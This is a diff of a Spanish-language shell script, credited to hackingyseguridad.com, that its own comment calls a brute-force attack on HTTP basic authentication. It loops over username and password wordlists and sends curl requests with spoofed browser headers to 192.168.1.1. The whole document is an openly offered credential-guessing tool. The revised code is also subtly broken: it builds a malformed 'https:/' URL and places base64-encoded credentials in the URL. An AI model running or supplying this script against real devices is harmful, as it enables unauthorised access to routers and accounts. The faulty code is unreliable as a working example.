@@ -1,9 +1,17 @@
-#!/bin/bash
-# Simple script de ataque fuerza bruta a http con autorizacion basica
-# (c) hackingyseguridad.com 2019
-for usuario in `cat usuarios.txt`; do echo "usuario $usuario"
-for clave in `cat claves.txt`; do echo "password $clave"; done
-curl -k -I -vvv  http://$usuario:$clave@192.168.1.1 \
+#!/bin/sh
+# Simple script de ataque fuerza bruta a http con autorizacion basica y credenciales codificadas en base 64
+# (c) hackingyseguridad.com 2021
+
+USERNAME_WORDLIST="usuarios.txt"
+PASSWORD_WORDLIST="claves.txt"
+
+while IFS= read -r user
+do
+    while IFS= read -r password
+    do
+            credencial=$(printf "%s:%s" "$user" "$password" |base64)
+
+curl -k "https:/$credencial@192.168.1.1" \
 -H 'Connection: keep-alive' \
 -H 'Upgrade-Insecure-Requests: 1' \
 -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36' \
@@ -13,4 +21,6 @@ curl -k -I -vvv  http://$usuario:$clave@192.168.1.1 \
 -H 'Accept-Encoding: gzip, deflate, br' \
 -H 'Accept-Language: es-ES,es;q=0.9,en;q=0.8' \
 --compressed
-done
+
+done < "$PASSWORD_WORDLIST"
+done < "$USERNAME_WORDLIST"
